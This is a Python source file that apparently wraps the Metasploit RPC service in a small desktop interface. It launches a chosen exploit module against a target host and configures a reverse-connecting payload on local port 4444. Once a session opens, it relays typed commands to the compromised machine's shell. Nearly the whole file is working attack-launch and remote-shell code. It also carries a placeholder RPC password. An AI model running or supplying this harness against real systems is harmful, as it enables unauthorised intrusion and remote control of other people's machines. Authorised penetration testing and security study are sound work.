# metasploit_interface.py
import subprocess
import time
import socket
import customtkinter as ctk
import tkinter as tk
from pymetasploit3.msfrpc import MsfRpcClient

# Configuration settings
rpc_password = 'your_secure_password'
rpc_port = 55553
rpc_server = '127.0.0.1'


def get_local_ip():
    """Retrieve the local IP address of the host."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.254.254.254', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip


def start_rpc_server():
    """Starts the Metasploit RPC server as a background process."""
    global rpc_process
    rpc_process = subprocess.Popen(['msfrpcd', '-P', rpc_password, '-S', '-a', rpc_server, '-p', str(rpc_port)],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(10)  # Give some time for the server to start


def stop_rpc_server():
    """Stops the RPC server."""
    rpc_process.terminate()
    rpc_process.wait()


def interactive_shell(shell, output_text_box, window):
    """Maintains an interactive shell session using ctk for input and output."""
    def send_command(event=None):
        command = command_entry.get()
        command_entry.delete(0, tk.END)
        if command.strip().lower() == 'exit':
            output_text_box.insert(tk.END, "Exiting shell...\n")
            window.destroy()
            return
        shell.write(command + '\n')
        time.sleep(1)  # Allow some time for the command to execute
        output = shell.read()
        output_text_box.insert(tk.END, output)
        output_text_box.see(tk.END)  # Auto-scroll to the end

    command_label = ctk.CTkLabel(window, text="Type exit to quit")
    command_label.pack(pady=5)

    command_entry = ctk.CTkEntry(window, width=280)
    command_entry.pack(pady=5, fill=tk.X)
    command_entry.bind('<Return>', send_command)

    send_button = ctk.CTkButton(window, text="Send", command=send_command)
    send_button.pack(pady=5)

    window.protocol("WM_DELETE_WINDOW", window.destroy)
    window.mainloop()


def run_exploit(exploit_name, payload_name, target_host, output_text_box):
    """Connects to the RPC server, runs the exploit, and handles the interaction."""
    try:
        start_rpc_server()
        client = MsfRpcClient(rpc_password, server=rpc_server, port=rpc_port)
        exploit = client.modules.use('exploit', exploit_name)
        exploit['RHOSTS'] = target_host

        payload = client.modules.use('payload', payload_name)
        local_ip = get_local_ip()
        output_text_box.insert(tk.END, f"Using local IP address: {local_ip}\n")
        output_text_box.see(tk.END)  # Auto-scroll to the end

        # Set LHOST and LPORT only if the payload requires it
        if 'LHOST' in payload.options:
            payload['LHOST'] = local_ip
        if 'LPORT' in payload.options:
            payload['LPORT'] = 4444  # Make sure this port is open on your local machine

        output_text_box.insert(tk.END, f"Launching exploit {exploit_name} with payload {payload_name}...\n")
        result = exploit.execute(payload=payload)
        output_text_box.insert(tk.END, f"Exploit launched with result: {result}\n")
        output_text_box.see(tk.END)  # Auto-scroll to the end

        # Wait for sessions to be established
        time.sleep(5)
        sessions = client.sessions.list

        if sessions:
            output_text_box.insert(tk.END, "Sessions established:\n")
            session_id, session_info = next(iter(sessions.items()))
            output_text_box.insert(tk.END, f"Session {session_id} opened.\n")
            output_text_box.see(tk.END)  # Auto-scroll to the end
            shell = client.sessions.session(session_id)

            # Start the interactive shell session
            shell_window = ctk.CTkToplevel()
            shell_window.geometry("300x150")
            shell_window.title(f"Interactive Shell - Session {session_id}")
            interactive_shell(shell, output_text_box, shell_window)
        else:
            output_text_box.insert(tk.END, "No sessions created, exploit may have failed or target is not vulnerable.\n")
            output_text_box.see(tk.END)  # Auto-scroll to the end
    except Exception as e:
        output_text_box.insert(tk.END, f"An error occurred: {e}\n")
        output_text_box.see(tk.END)  # Auto-scroll to the end
    finally:
        stop_rpc_server()
